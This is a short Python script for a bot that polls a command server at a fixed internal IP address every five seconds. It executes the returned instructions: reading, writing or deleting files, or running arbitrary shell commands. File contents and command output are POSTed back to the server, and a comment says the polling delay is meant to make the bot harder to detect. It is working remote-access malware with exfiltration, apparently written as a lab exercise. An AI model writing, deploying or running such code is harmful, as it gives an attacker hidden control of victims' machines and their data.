#!/usr/bin/python
from urllib import request

import subprocess
import os
from time import sleep
from sys import argv

import traceback


server_ip = '10.1.5.54:8001'

# run a system command and return its output
def run(command):
    return subprocess.check_output(
                             command,
                             stderr = subprocess.STDOUT,
                             shell = True)
# write contents (bytes object) to a file
def write(path, contents):
    f = open(path, 'wb')
    #print(f'writing to {path}')
    f.write(contents)
    #print(f'{contents}')
    f.close()

# read from a file and return contents as bytes
def read(path):
    f = open(path, 'rb')
    contents = f.read()
    f.close()
    return contents

# delete a file
def delete(path):
    os.remove(path)

# self-destruct the bot
def uninstall():
    pass


print("Bot is starting")
sleep(1)

while True:
    try:
        print("Getting command")
        with request.urlopen('http://' + server_ip + '/command.txt') as req:
            contents = req.read()

        # first line is the command, rest is payload
        parts = contents.split(b'\n', 1)
        command = str(parts[0], 'utf-8')
        payload = parts[1]

        print(command)

        if command == 'read':
            # payload is the file path, strip off \n from end
            data = read(str(payload[:-1], 'utf-8'))

            # POST results back to server
            req = request.Request('http://' + server_ip + '/contents', data)
            req.add_header('Content-type', 'application/octet-stream')
            request.urlopen(req).close()

        elif command == 'write':
            # first line of payload is the file path, remainder is contents
            parts = payload.split(b'\n', 1)
            path = parts[0]
            data = parts[1]
            write(path, data)

        elif command == 'delete':
            # payload is the file path, strip off \n from end
            data = delete(str(payload[:-1], 'utf-8'))

        elif command == 'run':
            # payload is the command
            data = run(str(payload, 'utf-8'))

            # POST results back to server
            req = request.Request('http://' + server_ip + '/output', data)
            req.add_header('Content-type', 'application/octet-stream')
            request.urlopen(req).close()

        elif command == 'change_ip':
            # payload is new IP address
            ip_address = str(payload[:-1], 'utf-8')

        elif command == 'uninstall':
            # bot should uninstall itself
            uninstall()

    except:
        # print out exception but don't crash program
        print(traceback.format_exc())

    print("Sleeping")
    # wait 5 seconds to make bot harder to detect
    sleep(5)

